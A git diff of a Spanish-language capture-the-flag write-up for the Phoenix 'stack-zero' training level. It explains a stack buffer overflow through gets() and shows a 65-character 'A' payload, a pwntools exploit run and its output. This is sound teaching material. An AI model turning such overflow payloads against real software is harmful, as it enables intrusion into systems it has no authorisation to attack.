@@ -14,7 +14,10 @@ tags: [PWN, Linux, Hacking, Easy]
 
 ![Untitled](/assets/images/2025-08-17-Phoenix/banner.png)
 
-Este nivel introduce el concepto de que se puede acceder a la memoria fuera de su región asignada, cómo se disponen las variables de la pila y que la modificación fuera de la memoria asignada puede modificar la ejecución del programa.
+Este primer nivel introduce el concepto de **desbordamiento de buffer en la pila**. Aquí se muestra cómo es posible acceder a memoria fuera de la región asignada, comprendiendo la disposición de las variables en el stack y cómo una sobrescritura puede alterar el flujo del programa.
+
+El programa define una estructura que contiene un buffer de 64 bytes seguido de una variable changeme. El uso de gets() hace posible escribir más datos de los esperados, sobrescribiendo memoria contigua.
+
 
 ```c
 /*
@@ -62,7 +65,9 @@ int main(int argc, char **argv) {
 }
 ```
 
-se ejecuta el binario y se le pasa un valor para ver el resultado
+Ejecución manual
+
+Primero probamos con un solo carácter:
 
 ```c
 user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-zero 
@@ -71,7 +76,7 @@ A
 Uh oh, 'changeme' has not yet been changed. Would you like to try again?
 ```
 
-Como vemos en el código dice que el buffer es de 64, así que imprimimos 65 caracteres en este caso 65 A
+Dado que el buffer tiene 64 bytes, si enviamos 65 caracteres lograremos sobrescribir la variable changeme:
 
 ```c
 user@phoenix-amd64:/opt/phoenix/amd64$ python -c 'print "A"*65'
@@ -88,7 +93,9 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Well done, the 'changeme' variable has been changed!
 ```
 
-Una vez que se realiza en local de forma manual, vamos a realizar un exploit para la explotación de este reto 
+Explotación con Pwntools
+
+Para automatizar el proceso creamos un script en Python con pwntools:
 
 ```c
 ┌──(root㉿angussMoody)-[/mnt/angussMoody/PWN/Phoenix/0_stack-zero]
@@ -121,7 +128,7 @@ Una vez que se realiza en local de forma manual, vamos a realizar un exploit par
 ───────┴─────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 
-Ejecución del exploit
+Ejecución del exploit:
 
 ```c
 ┌──(root㉿angussMoody)-[/mnt/angussMoody/PWN/Phoenix/0_stack-zero]
@@ -143,3 +150,7 @@ Ejecución del exploit
 [+] Output: Welcome to phoenix/stack-zero, brought to you by https://exploit.education
     Well done, the 'changeme' variable has been changed!
 ```
+
+Conclusión
+
+Este reto muestra cómo un buffer overflow simple permite sobrescribir variables locales en la pila. Aunque no se logra ejecución de código arbitrario, es la base para comprender vulnerabilidades más complejas que se verán en los siguientes niveles de la serie Stack.
